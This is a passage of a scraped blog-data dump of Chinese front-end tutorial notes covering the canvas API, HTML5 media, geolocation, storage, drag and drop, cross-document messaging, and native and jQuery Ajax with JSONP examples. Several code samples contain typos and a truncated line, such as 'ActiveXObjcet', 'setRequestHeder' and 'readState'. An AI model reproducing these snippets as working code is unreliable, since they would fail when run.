改变画布比例 默认值是（1.0,1.0）这些值可以是负值 transform（m1,m2,m3,m4,dx,dy）修改画布的转换矩阵。新矩阵是基于之前的矩阵得到的 setTransform（m1,m2,m3,m4,dx,dy）修改画布的转换矩阵。重置之前的值，声明新的值 save()保存画布状态，包括转换矩阵、样式属性、裁剪遮罩 restore() 恢复上一次保存的状态 drawImage() 在画布上绘制图像 属性 canvas API专用属性列表 rect( x, y, width, height ) 绘制矩形 fillRect( x, y, width, height ) 绘制被填充的矩形 strokeRect( x, y, width, height ) 绘制矩形（无填充） clearRect( x, y, width, height ) 清除指定的矩形内的像素 fill() 填充当前绘图（路径） stroke()绘制已定义的路径 beginPath() 起始（重置）当前路径 moveTo( x, y ) 将笔触移动到指定的坐标(x,y) lineTo( x, y ) 绘制一条从当前位置到指定的坐标(x,y)的直线 clip() 从原始画布剪切任意形状和尺寸的区域 quadraticCurveTo() 创建二次贝塞尔曲线 bezierCurveTo() 创建三次贝塞尔曲线 arc( x, y, radius, startAngle, endAngle, anticlockwise) 绘制圆或圆弧 arcTo( x1, y1, x2, y2, radius) 根据给定点画圆弧，再以直线连接两个点 isPointInPath( x, y ) 检测指定的点是否在当前路径中，在则返回true。 fillStyle 设置或返回用于填充绘画的颜色、渐变或模式 strokeStyle 设置或返回用于笔触的颜色、渐变或模式 shadowColor 设置或返回用于阴影的颜色 shadowBlur 设置或返回用于阴影的模糊级别 shadowOffsetX 设置或返回阴影与形状的水平距离 shadowOffsetY 设置或返回阴影与形状的垂直距离 lineCap 设置或返回线条的结束点样式（butt、round、square） lineJoin 设置或返回当两条线交汇时，边角的类型（bevel、round、miter） lineWidth 设置或返回当前的线条宽度 miterLimit 设置或返回最大斜接长度 createLinearGradient( x0, y0, x1, y1 ) 创建线性渐变 createPattern( image/canvas/video, repeat ) 在指定的方向内重复绘制指定的元素 createRadialGradient( x0, y0, r0, x1, y1, r1 )创建径向渐变 addColorStop( stop, color ) 规定渐变对象中的颜色和停止位置 font 设置或返回文本内容的当前字体属性（和css的font一样） textAlign 设置或返回文本内容的当前对齐方式 textBaseline 设置或返回在绘制文本时使用的当前文本基线 fillText( text, x, y ) 在画布上绘制“被填充”的文本 strokeText( text, x, y ) 在画布上绘制文本（无填充） measureText( text ) 返回包含指定文本宽度的对象（属性width获取宽度） drawImage( image/canvas, x, y )、drawImage( image/canvas, x, y, width, height )、drawImage( image/canvas, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight )` 在画布上绘制图像、画布或视频 createImageData( width, height )、createImageData(imageData) 绘制ImageData对象 getImageData( x, y, width, height ) 返回ImageData对象，该对象为画布上指定的矩形复制像素数据。 putImageData( ImageData, x, y )、putImageData( imageData, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight ) 把图像数据放回画布上。 width 返回ImageData对象的宽度 height 返回ImageData对象的高度 data 返回一个对象，包含指定的ImageData对象的图像数据 globalAlpha 设置或返回绘图的当前alpha或透明度 globalCompositeOperation 设置或返回新图像如何绘制到已有的图像上。 scale( x, y ) 缩放当前绘图 translate( x, y ) 重新设置画布上的(0,0)位置 rotate( angle ) 选择当前绘图，单位为“弧度”，角度转弧度公式（ degrees*Math.PI/180） transform( m11, m12, m21, m22, dx, dy ) 替换绘图的当前转换矩阵 setTransform() 将当前转换重置为单元矩阵，然后运行transform() save() 保存当前环境的状态 restore() 恢复之前保存过的路径状态和属性 getContext(&#39;2d&#39;) 获取2d对象 toDataURL() 将canvas转换成图片，返回地址 canvas常用总结 标签 &lt;canvas&gt; 不支持canvas 的浏览器可以看到的内容 &lt;canvas&gt; 绘制环境 getContext(&quot;2d&quot;);目前支持2d的场景 绘制矩形 rect(L,T,W,H):创建一个矩形 fillRect(L,T,W,H):绘制填充的矩形 strokeRect(L,T,W,H)绘制矩形(无填充) 默认一像素黑色边框 设置绘图 fillStyle:填充颜色(绘制canvas是有顺序的) lineWidth:线宽度，笔迹粗细 strokeStyle:边线颜色 绘制路径 stroke ：绘制，划线(黑色默认) fill :填充(黑色默认) rect(矩形区域) clearRect 擦除一个矩形区域 save 进入到XXX（高逼格）状态 restore 退出xxx（高逼格）状态 绘制圆形 arc(x,y,半径,起始弧度,结束弧度,旋转方向) x，y起始位置 弧度与角度：弧度=角度 x π / 180 旋转方向：顺时针（默认：false），逆时针（true） 绘制字体 font：设置字体大小 fillText：填充字体 strokeText：绘制字体 二、视频音频 视频音频格式的简单介绍 常见的视频格式 视频的组成部分：画面、音频、编码格式 视频编码：H.264、Theora、VP8(google开源) 常见的音频格式 视频编码：ACC、MP3、Vorbis HTML5能在完全脱离插件的情况下播放音视频,但是不是所有格式都支持。 支持的视频格式： Ogg=带有Theora视频编码+Vorbis音频编码的Ogg文件 MEPG4=带有H.264视频编码+AAC音频编码的MPEG4文件 WebM=带有VP8视频编码+Vorbis音频编码的WebM格式 Video的使用 单独用法 &lt;video src=&quot;文件地址&quot; controls=&quot;controls&quot;&gt;&lt;/video&gt; 带提示用法 123&lt; video src=\"文件地址\" controls=\"controls\"&gt; 您的浏览器暂不支持video标签。播放视频&lt;/ video &gt; 兼容用法 12345&lt; video controls=\"controls\" width=\"300\"&gt; &lt;source src=\"move.ogg\" type=\"video/ogg\" &gt; &lt;source src=\"move.mp4\" type=\"video/mp4\" &gt; 您的浏览器暂不支持video标签。播放视频&lt;/ video &gt; Video的常见属性 属性 值 描述 Autoplay Autoplay 视频就绪自动播放 controls controls 向用户显示播放控件 Width Pixels(像素) 设置播放器宽度 Height Pixels(像素) 设置播放器高度 Loop Loop 播放完是否继续播放该视频，循环播放 Preload load{auto,meta,none} 规定是否预加载视频。 Src url 视频url地址 Poster Imgurl 加载等待的画面图片 Autobuffer Autobuffer 设置为浏览器缓冲方式，不设置autoply才有效 Video的API方法 方法 属性 事件 play() currentSrc play pause() currentTime pause load() videoWidth progress canPlayType() videoHeight error 三、地理信息与本地存储 地理位置 经度 : 南北极的连接线 纬度 : 东西连接的线 位置信息从何而来 IP地址 GPS全球定位系统 Wi-Fi无线网络 基站 avigator.geolocation 单次定位请求 ：getCurrentPosition(请求成功,请求失败,数据收集方式) 请求成功函数 经度 : coords.longitude 纬度 : coords.latitude 准确度 : coords.accuracy 海拔 : coords.altitude 海拔准确度 : coords.altitudeAcuracy 行进方向 : coords.heading 地面速度 : coords.speed 请求的时间: new Date(position.timestamp) 请求失败函数 失败编号 ：code 0 : 不包括其他错误编号中的错误 1 : 用户拒绝浏览器获取位置信息 2 : 尝试获取用户信息，但失败了 3 : 设置了timeout值，获取位置超时了 数据收集 : json的形式 enableHighAcuracy : 更精确的查找，默认false timeout : 获取位置允许最长时间，默认infinity maximumAge : 位置可以缓存的最大时间，默认0 多次定位请求* : watchPosition 移动设备有用，位置改变才会触发 配置参数：frequency 更新的频率 关闭更新请求 : clearWatch 百度地图API 1&lt;script src=\"http://api.map.baidu.com/api?v=2.0&amp;ak=qZfInp9MaT9Qa0PoNy4Rmx3Y9W9ZXMfw\"&gt;&lt;/script&gt; 本地存储 Storage sessionStorage session临时回话，从页面打开到页面关闭的时间段 窗口的临时存储，页面关闭，本地存储消失 localStorage 永久存储（可以手动删除数据） Storage的特点 存储量限制 ( 5M ) 客户端完成，不会请求服务器处理 sessionStorage数据是不共享、 localStorage共享 Storage API setItem(): 设置数据，(key,value)类型，类型都是字符串 可以用获取属性的形式操作 getItem(): 获取数据，通过key来获取到相应的value removeItem(): 删除数据，通过key来删除相应的value clear(): 删除全部存储的值 存储事件: 当数据有修改或删除的情况下，就会触发storage事件 在对数据进行改变的窗口对象上是不会触发的` Key : 修改或删除的key值，如果调用clear(),key为null newValue : 新设置的值，如果调用removeStorage(),key为null oldValue : 调用改变前的value值 storageArea : 当前的storage对象 url : 触发该脚本变化的文档的url 注：session同窗口才可以,例子：iframe操作 四、HTML5拖拽 图片自带拖拽功能 其他元素可设置draggable属性 draggable ：true 拖拽元素(被拖拽元素对象)事件 : ondragstart : 拖拽前触发 ondrag :拖拽前、拖拽结束之间，连续触发 ondragend :拖拽结束触发 目标元素(拖拽元素被拖到的对象)事件 : ondragenter :进入目标元素触发 ondragover:进入目标、离开目标之间，连续触发 ondragleave :离开目标元素触发 ondrop :在目标元素上释放鼠标触发 需要在ondragover事件里面阻止默认事件 拖拽兼容问题 火狐浏览器下需设置dataTransfer对象才可以拖拽除图片外的其他标签 dataTransfer对象 setData() : 设置数据 key和value(必须是字符串) getData() : 获取数据，根据key值，获取对应的value effectAllowed : 设置光标样式(none, copy, copyLink, copyMove, link, linkMove,move, all 和uninitialized) setDragImage ：三个参数（指定的元素，坐标X，坐标Y） files： 获取外部拖拽的文件，返回一个filesList列表 filesList下有个type属性，返回文件的类型 读取文件信息 FileReader(读取文件信息) readAsDataURL 参数为要读取的文件对象 onload当读取文件成功完成的时候触发此事件 this. result 获取读取的文件数据 五、跨文档操作 跨文档请求 同域跨文档 iframe内页： 父页面操作子页面：contentWindow 子页面操作父页面：window.top(找到最顶级的父页面)/parent(第一父页面) 新窗口页： 父页面操作子页面：window.open 子页面操作父页面：window.opener 不同域跨文档 postMessage（“发送的数据”,”接收的域”） message事件监听 ev.origin发送数据来源的域 ev.data 发送的数据 通过判断发送的数据来执行相应的需求 ajax跨域 XMLHttpRequest 新增功能 跨域请求：修改服务端头信息 IE兼容：XDomaiRequest 进度事件： upload.onprogress(ev) 上传进度(实现文件上传进度条) ev.total 发送文件的总量 ev.loaded 已发送的量 FormData 构建提交二进制数据","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"API","slug":"API","permalink":"https://ru23.com/tags/API/"}]},{"title":"Ajax总结篇","slug":"2016-11-Ajax-summary","date":"2016-11-26T06:35:24.000Z","updated":"2018-10-24T03:46:01.934Z","comments":true,"path":"note/d4e64c45.html","link":"","permalink":"https://ru23.com/note/d4e64c45.html","excerpt":"","text":"原文出处 http://blog.poetries.top/2016/11/26/Ajax-summary 本文主要总结整理Ajax的一些常用的基础知识，适合初学者。 一、Ajax简介、优劣势、应用场景以及技术 Ajax简介 : Asynchronous Javascript And XML （异步的JavaScript和XML） 它并不是一种单一的技术，而是有机利用一系列交互式网页应用相关的技术所形成的结合体 AJAX 是一种用于创建快速动态网页的技术。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。 优点： 页面无刷新，用户体验好。 异步通信，更加快的响应能力。 减少冗余请求，减轻了服务器负担 基于标准化的并被广泛支持的技术，不需要下载插件或者小程序 缺点： ajax干掉了back按钮，即对浏览器后退机制的破坏。 存在一定的安全问题。 对搜索引擎的支持比较弱。 破坏了程序的异常机制。 无法用URL直接访问 ajax应用场景 场景 1. 数据验证 场景 2. 按需取数据 场景 3. 自动更新页面 AJAX 包含以下五个部分：ajax并非一种新的技术，而是几种原有技术的结合体。它由下列技术组合而成。 使用CSS和XHTML来表示。 使用DOM模型来交互和动态显示。 数据互换和操作技术，使用XML与XSLT 使用XMLHttpRequest来和服务器进行异步通信。 使用javascript来绑定和调用。 在上面几中技术中，除了XmlHttpRequest对象以外，其它所有的技术都是基于web标准并且已经得到了广泛使用的，XMLHttpRequest虽然目前还没有被W3C所采纳，但是它已经是一个事实的标准，因为目前几乎所有的主流浏览器都支持它 第一张图尤其说明了传统Web 应用程序的结构与采用了 AJAX 技术的 Web应用程序的结构上的差别 主要的差别，其实不是 JavaScript，不是 HTML/XHTML和 CSS，而是采用了 XMLHttpRequest 来向服务器异步的请求 XML 数据 再来看第二张图，传统的 Web 应用模式，用户的体验是割裂的，点击-&gt;等待-&gt;看到新的页面-&gt;再点击-&gt;再等待。而采用了AJAX技术之后，大部分的计算工作，都是在用户不察觉的情况下，交由服务器去完成了 XMLHttpRequest对象的属性 XMLHttpRequest对象的方法 二、创建ajax的步骤 Ajax的原理简单来说通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。这其中最关键的一步就是从服务器获得请求数据。原生创建ajax可分为以下四步 1、创建XMLHttpRequest对象 Ajax的核心是XMLHttpRequest对象，它是Ajax实现的关键，发送异步请求、接受响应以及执行回调都是通过它来完成 所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均内建 XMLHttpRequest 对象。 创建 XMLHttpRequest对象的语法： 1var xhr = new XMLHttpRequest(); 老版本的 Internet Explorer（IE5 和 IE6）使用ActiveX 对象： 1var xhr = new ActiveXObject(\"Microsoft.XMLHTTP\"); 为了应对所有的现代浏览器，包括 IE5 和 IE6，请检查浏览器是否支持 XMLHttpRequest对象。如果支持，则创建XMLHttpRequest对象。如果不支持，则创建ActiveXObject： 兼容各个浏览器的创建Ajax的工具函数 12345678910111213141516function createRequest ()&#123; try &#123; xhr = new XMLHttpRequest(); &#125;catch (tryMS)&#123; try &#123; xhr = new ActiveXObject(\"Msxm12.XMLHTTP\"); &#125; catch (otherMS) &#123; try &#123; xhr = new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125;catch (failed) &#123; xhr = null; &#125; &#125; &#125; return xhr;&#125; 2、准备请求 初始化该XMLHttpRequest对象，接受三个参数： 1xhr.open(method,url,async); 第一个参数表示请求类型的字符串，其值可以是GET或者POST。 GET请求： 1xhr.open(\"GET\",demo.php?name=tsrot&amp;age=24,true); POST请求： 1xhr.open(\"POST\",demo.php,true); 第二个参数是要作为请求发送目标的URL。 第三个参数是true或false，表示请求是以异步还是同步的模式发出。（默认为true，一般不建议为false） false：同步模式发出的请求会暂停所有javascript代码的执行，知道服务器获得响应为止，如果浏览器在连接网络时或者在下载文件时出了故障，页面就会一直挂起。 true：异步模式发出的请求，请求对象收发数据的同时，浏览器可以继续加载页面，执行其他javascript代码 3、发送请求 1xhr.send(); 一般情况下，使用Ajax提交的参数多是些简单的字符串，可以直接使用GET方法将要提交的参数写到open方法的url参数中，此时send方法的参数为null或为空。 GET请求： 12xhr.open(\"GET\",demo.php?name=tsrot&amp;age=24,true);xhr.send(null); POST请求：如果需要像 HTML 表单那样 POST 数据，请使用 setRequestHeader()来添加 HTTP 头。然后在send()方法中规定您希望发送的数据： 123xhr.open(\"POST\",demo.php,true);xhr.setRequestHeder(\"Content-Type\",\"application/x-www-form-urlencoded;charset=UTF-8\");xhr.sen 4、处理响应 12345xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; console.log(xhr.responseText); &#125;&#125; onreadystatechange ：当处理过程发生变化的时候执行下面的函数 readyState ：ajax处理过程 0：请求未初始化（还没有调用 open()）。 1：请求已经建立，但是还没有发送（还没有调用 send()）。 2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。 3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。 4：响应已完成；您可以获取并使用服务器的响应了。 status属性： 200:”OK” 404: 未找到页面 responseText：获得字符串形式的响应数据 responseXML：获得 XML形式的响应数据 对象转换为JSON格式使用JSON.stringify json转换为对象格式用JSON.parse() 返回值一般为json字符串，可以用JSON.parse(xhr.responseText)转化为JSON对象 从服务器传回的数据是json格式，这里做一个例子说明，如何利用 1、首先需要从XMLHttpRequest对象取回数据这是一个JSON串，把它转换为真正的JavaScript对象。使用JSON.parse(xhr.responseText)转化为JSON对象 2、遍历得到的数组，向DOM中添加新元素 123456789101112function example(responseText)&#123;var saleDiv= document.getElementById(\"sales\");var sales = JSON.parse(responseText); for(var i=0;i&lt;sales.length;i++)&#123; var sale = sales[i]; var div = document.createElement(\"div\"); div.setAttribute(\"class\",\"salseItem\"); div.innerHTML = sale.name + sale.sales; salseDiv.appendChild(div); &#125;&#125; HTTP状态码 5、封装例子 将AJAX请求封装成ajax()方法，它接受一个配置对象params 1234567891011121314151617181920function ajax(params) &#123; params = params || &#123;&#125;; params.data = params.data || &#123;&#125;; // 判断是ajax请求还是jsonp请求 var json = params.jsonp ? jsonp(params) : json(params); // ajax请求 function json(params) &#123; // 请求方式，默认是GET params.type = (params.type || 'GET').toUpperCase(); // 避免有特殊字符，必须格式化传输数据 params.data = formatParams(params.data); var xhr = null; // 实例化XMLHttpRequest对象 if(window.XMLHttpRequest) &#123; xhr = new XMLHttpRequest(); &#125; else &#123; // IE6及其以下版本 xhr = new ActiveXObjcet('Microsoft.XMLHTTP'); &#125;; 使用实例： 123456789ajax(&#123; url: 'test.php', // 请求地址 type: 'POST', // 请求类型，默认\"GET\"，还可以是\"POST\" data: &#123;'b': '异步请求'&#125;, // 传输数据 success: function(res)&#123; // 请求成功的回调函数 console.log(JSON.parse(res)); &#125;, error: function(error) &#123;&#125; // 请求失败的回调函数&#125;); 这个过程是一定要记在脑子里的 12345678910111213141516171819function ajax(url, success, fail)&#123; // 1. 创建连接 var xhr = null; xhr = new XMLHttpRequest() // 2. 连接服务器 xhr.open('get', url, true) // 3. 发送请求 xhr.send(null); // 4. 接受请求 xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4)&#123; if(xhr.status == 200)&#123; success(xhr.responseText); &#125; else &#123; // fail fail &amp;&amp; fail(xhr.status); &#125; &#125; &#125;&#125; XMLHttpRequest 在异步请求远程数据时的工作流程 谈谈JSONP 要访问web服务器的数据除了XMLHttpRequest外还有一种方法是JSONP 如果HTML和JavaScript与数据同时在同一个机器上，就可以使用XMLHttpRequest 什么是JSONP？ JSONP(JSON with Padding)是一个非官方的协议，它允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式） JSONP有什么用？ 由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过script标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求 如何使用JSONP？ 在客户端声明回调函数之后，客户端通过script标签向服务器跨域请求数据，然后服务端返回相应的数据并动态执行回调函数 用XMLHttpRequest时，我们得到一个字符串；要用JSON.parse把字符串转化成对象，使用jsonp时，script标志会解析并执行返回的代码，等我们处理数据时，已经是一个JavaScript对象了 简单实例 12345678910111213&lt;meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\" /&gt; &lt;script type=\"text/javascript\"&gt; function jsonpCallback(result) &#123; alert(result.a); alert(result.b); alert(result.c); for(var i in result) &#123; alert(i+\":\"+result[i]);//循环输出a:1,b:2,etc. &#125; &#125; &lt;/script&gt; &lt;script type=\"text/javascript\" src=\"http://crossdomain.com/services.php?callback=jsonpCallback\"&gt;&lt;/script&gt; &lt;!--callback参数指示生成JavaScript代码时要使用的函数jsonpcallback--&gt; 注意浏览器的缓存问题 在末尾增加一个随机数可避免频繁请求同一个链接出现的缓存问题 ` 原生JavaScript实现完整的Ajax、JSONP例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899function ajax(params) &#123; params = params || &#123;&#125;; params.data = params.data || &#123;&#125;; var json = params.jsonp ? jsonp(params) : json(params); // ajax请求 function json(params) &#123; params.type = (params.type || 'GET').toUpperCase(); params.data = formatParams(params.data); var xhr = null; // 实例化XMLHttpRequest对象 if(window.XMLHttpRequest) &#123; xhr = new XMLHttpRequest(); &#125; else &#123; // IE6及其以下版本 xhr = new ActiveXObjcet('Microsoft.XMLHTTP'); &#125;; // 监听事件 xhr.onreadystatechange = function() &#123; if(xhr.readyState == 4) &#123; var status = xhr.status; if(status &gt;= 200 &amp;&amp; status &lt; 300) &#123; var response = ''; var type = xhr.getResponseHeader('Content-type'); if(type.indexOf('xml') !== -1 &amp;&amp; xhr.responseXML) &#123; response = xhr.responseXML; //Document对象响应 &#125; else if(type === 'application/json') &#123; response = JSON.parse(xhr.responseText); //JSON响应 &#125; else &#123; response = xhr.responseText; //字符串响应 &#125;; params.success &amp;&amp; params.success(response); &#125; else &#123; params.error &amp;&amp; params.error(status); &#125; &#125; &#125;; // 连接和传输数据 if(params.type == 'GET') &#123; xhr.open(params.type, params.url + '?' + params.data, true); xhr.send(null); &#125; else &#123; xhr.open(params.type, params.url, true); //设置提交时的内容类型 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8'); xhr.send(params.data); &#125; &#125; // jsonp请求 function jsonp(params) &#123; //创建script标签并加入到页面中 var callbackName = params.jsonp; var head = document.getElementsByTagName('head')[0]; // 设置传递给后台的回调参数名 params.data['callback'] = callbackName; var data = formatParams(params.data); var script = document.createElement('script'); head.appendChild(script); //创建jsonp回调函数 window[callbackName] = function(json) &#123; head.removeChild(script); clearTimeout(script.timer); window[callbackName] = null; params.success &amp;&amp; params.success(json); &#125;; //发送请求 script.src = params.url + '?' + data; //超时处理 if(params.time) &#123; script.timer = setTimeout(function() &#123; window[callbackName] = null; head.removeChild(script); params.error &amp;&amp; params.error(&#123; message: '超时' &#125;); &#125;, time); &#125; &#125;; //格式化参数 function formatParams(data) &#123; var arr = []; for(var name in data) &#123; arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name])); &#125;; // 添加一个随机数，防止缓存 arr.push('v=' + random()); return arr.join('&amp;'); &#125; // 获取随机数 function random() &#123; return Math.floor(Math.random() * 10000 + 500); &#125;&#125; 使用 12345678910111213141516171819202122232425262728ajax(&#123; url: 'get.php', type: 'GET', data: &#123;'intro': 'get请求'&#125;, success:function(res)&#123; res = JSON.parse(res); document.getElementById('a').innerHTML = res.intro; console.log(res); &#125; &#125;); ajax(&#123; url: 'post.php', type: 'POST', data: &#123;'intro': 'post请求'&#125;, success:function(res)&#123; res = JSON.parse(res); document.getElementById('b').innerHTML = res.intro; console.log(res); &#125; &#125;); ajax(&#123; url: 'http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js', jsonp: 'jsonpCallback', data: &#123;'callback': 'jsonpCallback'&#125;, success:function(res)&#123; JsonCallback(json); &#125; &#125;); 下面我们就根据以上 封装的例子跨域获取qq音乐的数据 在线演示–跨域获取qq音乐的数据 下面的方法也可以实现 使用jQuery实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;script src=\"jquery-3.1.0.min.js\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $.ajax(&#123; type: \"get\", async: false, url: \"http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js\", dataType: \"jsonp\", jsonp: \"callback\", jsonpCallback: \"JsonCallback\", scriptCharset: 'GBK',//设置编码，否则会乱码 success: function(data) &#123; //var result = JSON.stringify(data); JsonCallback(data); &#125;, error: function() &#123; alert('fail'); &#125; &#125;); function JsonCallback(json)&#123; var data = json.songlist; var html = ''; for (var i=0;i&lt;data.length;i++) &#123; document.write(data[i].url+\"&lt;br&gt;\"); &#125; &#125; &lt;/script&gt;``` - 原生js简洁实现```javascriptvar script = document.createElement(\"script\"); script.src = 'http://music.qq.com/musicbox/shop/v3/data/hit/hit_all.js?callback=JsonCallback'; document.body.appendChild(script); function JsonCallback(json)&#123; var data = json.songlist; var html = ''; for (var i=0;i&lt;data.length;i++) &#123; console.log(data[i]); &#125; &#125; 三、 jQuery中的Ajax jQuery中的ajax封装案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//ajax请求后台数据var btn = document.getElementsByTagName(\"input\")[0];btn.onclick = function()&#123; ajax(&#123;//json格式 type:\"post\", url:\"post.php\", data:\"username=poetries&amp;pwd=123456\", asyn:true, success:function(data)&#123; document.write(data); &#125; &#125;);&#125;//封装ajaxfunction ajax(aJson)&#123; var ajx = null; var type = aJson.type || \"get\"; var asyn = aJson.asyn || true; var url = aJson.url; // url 接收 传输位置 var success = aJson.success;// success 接收 传输完成后的回调函数 var data = aJson.data || '';// data 接收需要附带传输的数据 if(window.XMLHttpRequest)&#123;//兼容处理 ajx = new XMLHttpRequest();//一般浏览器 &#125;else &#123; ajx = new ActiveXObject(\"Microsoft.XMLHTTP\");//IE6+ &#125; if (type == \"get\" &amp;&amp; data) &#123; url +=\"/?\"+data+\"&amp;\"+Math.random(); &#125; //初始化ajax请求 ajx.open( type , url , asyn ); //规定传输数据的格式 ajx.setRequestHeader('content-type','application/x-www-form-urlencoded'); //发送ajax请求（包括post数据的传输） type == \"get\" ?ajx.send():ajx.send(aJson.data); //处理请求 ajx.onreadystatechange = function(aJson)&#123; if(ajx.readState == 4)&#123; if (ajx.status == 200 &amp;&amp; ajx.status&lt;300)//200是HTTP 请求成功的状态码 &#123; //请求成功处理数据 success &amp;&amp; success(ajx.responseText); &#125;else&#123; alert(\"请求出错\"+ajx.status); &#125; &#125; &#125; jQuery中的Ajax的一些方法 jquery对Ajax操作进行了封装，在jquery中的$.ajax()方法属于最底层的方法，第2层是load()、$.get()、$.post();第3层是$.getScript()、$.getJSON()，第2层使用频率很高 load()方法 load()方法是jquery中最简单和常用的ajax方法，能载入远程HTML代码并插入DOM中 结构为：load(url,[data],[callback]) 使用url参数指定选择符可以加载页面内的某些元素 load方法中url语法：url selector 注意：url和选择器之间有一个空格 传递方式 load()方法的传递方式根据参数data来自动指定，如果没有参数传递，则采用GET方式传递，反之，采用POST 回调参数 必须在加载完成后才执行的操作，该函数有三个参数 分别代表请求返回的内容、请求状态、XMLHttpRequest对象 只要请求完成，回调函数就会被触发 12345$(\"#testTest\").load(\"test.html\",function(responseText,textStatus,XMLHttpRequest)&#123; //respnoseText 请求返回的内容 //textStatus 请求状态 ：sucess、error、notmodified、timeout //XMLHttpRequest &#125;) load方法参数 参数名称 类型 说明 url String 请求HTML页面的URL地址 data(可选) Object 发送至服务器的key / value数据 callback(可选) Function 请求完成时的回调函数，无论是请求成功还是失败 $.get()和$.post()方法 load()方法通常用来从web服务器上获取静态的数据文件。在项目中需要传递一些参数给服务器中的页面，那么可以使用$.get()和$.post()或$.ajax()方法 注意：$.get()和$.post()方法是jquery中的全局函数 $.get()方法 $.get()方法使用GET方式来进行异步请求 结构为：$.get(url,[data],callback,type) 如果服务器返回的内容格式是xml文档，需要在服务器端设置Content-Type类型 代码如下：header(&quot;Content-Type:text/xml:charset=utf-8&quot;) //php $.get()方法参数解析 参数 类型 说明 url String 请求HTML页的地址 data(可选) Object 发送至服务器的key/ value 数据会作为QueryString附加到请求URL中 callback(可选) Function 载入成功的回调函数（只有当Response的返回状态是success才调用该方法） type(可选) String 服务器返回内容的格式，包括xml、html、script、json、text和_default $.post()方法 它与$.get()方法的结构和使用方式相同，有如下区别 GET请求会将参数跟张乃URL后进行传递，而POST请求则是作为Http消息的实体内容发送给web服务器，在ajax请求中，这种区别对用户不可见 GET方式对传输数据有大小限制（通常不能大于2KB），而使用POST方式传递的数据量要比GET方式大得多（理论不受限制） GET方式请求的数据会被浏览器缓存起来，因此其他人可以从浏览器的历史纪录中读取这些数据，如：账号、密码。在某种情况下，GET方式会带来严重的安全问题，而POST相对来说可以避免这些问题 GET和POST方式传递的数据在服务端的获取也不相同。在PHP中，GET方式用$_GET[]获取；POST方式用$_POST[]获取;两种方式都可用$_REQUEST[]来获取 总结 使用load()、$.get()和$.post()方法完成了一些常规的Ajax程序，如果还需要复杂的Ajax程序，就需要用到$.ajax()方式 $.ajax()方法 $.ajax()方法是jquery最底层的Ajax实现，它的结构为$.ajax(options) 该方法只有一个参数，但在这个对象里包含了$.ajax()方式所需要的请求设置以及回调函等信息，参数以key / value存在，所有参数都是可选的 $.ajax()方式常用参数解析 参数 类型 说明 url String (默认为当前页地址)发送请求的地址 type String 请求方式（POST或GET）默认为GET timeout Number 设置请求超时时间（毫秒） dataType String 预期服务器返回的类型。可用的类型如下 xml:返回XML文档，可用jquery处理html:返回纯文本的HTML信息，包含的script标签也会在插入DOM时执行script：返回纯文本的javascript代码。不会自动缓存结果，除非设置cache参数。注意：在远程请求时，所有的POST请求都将转为GET请求json:返回JSON数据jsonp:JSONP格式，使用jsonp形式调用函数时，例如：myurl?call back=?,jquery将自动替换后一个？为正确的函数名，以执行回调函数text:返回纯文本字符串 beforeSend Function 发送请求前可以修改XMLHttpRequest对象的函数，例如添加自定义HTTP头。在beforeSend中如果返回false可以取消本次Ajax请求。XMLHttpRequest对象是唯一的参数 function(XMLHttpRequest){ this;//调用本次Ajax请求时传递的options参数} complete Function 请求完成后的回调函数（请求成功或失败时都调用） 参数：XMLHttpRequest对象和一个描述成功请求类型的字符串function(XMLHttpRequest,textStatus){ this;//调用本次Ajax请求时传递的options参数} success Function 请求成功后调用的回调函数，有两个参数(1)由服务器返回，并根据dataTyppe参数进行处理后的数据(2)描述状态的字符串function(data,textStatus){ //data可能是xmlDoc、`jsonObj、html、text等&lt;br&gt;this;//调用本次Ajax请求时传递的options`参数} error Function 请求失败时被调用的函数 global Boolean 默认为true。表示是否触发全局Ajax事件，设置为false将不会触发。AjaxStart或AjaxStop可用于控制各种Ajax事件 参考 锋利的jQuery","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"Ajax","slug":"Ajax","permalink":"https://ru23.com/tags/Ajax/"}]},{"title":"bootstrap笔记总结","slug":"2016-11-bootstrap-review","date":"2016-11-19T08:55:24.000Z","updated":"2018-10-24T03:46:01.936Z","comments":true,"path":"note/2e40f178.html","link":"","permalink":"https://ru23.com/note/2e40f178.html","excerpt":"原文出处 http://blog.poetries.top/2016/11/19/bootstrap-review 最近项目中用到bootstrap 很是健忘各种属性类名，频繁翻阅文档，在这里暂且记录一下笔记","text":"原文出处 http://blog.poetries.top/2016/11/19/bootstrap-review 最近项目中用到bootstrap 很是健忘各种属性类名，频繁翻阅文档，在这里暂且记录一下笔记 一、 bootstrap简介 Bootstrap，来自 Twitter（全国最大的微博），是目前最受欢迎的前端框架。 bootstrap下载及演示 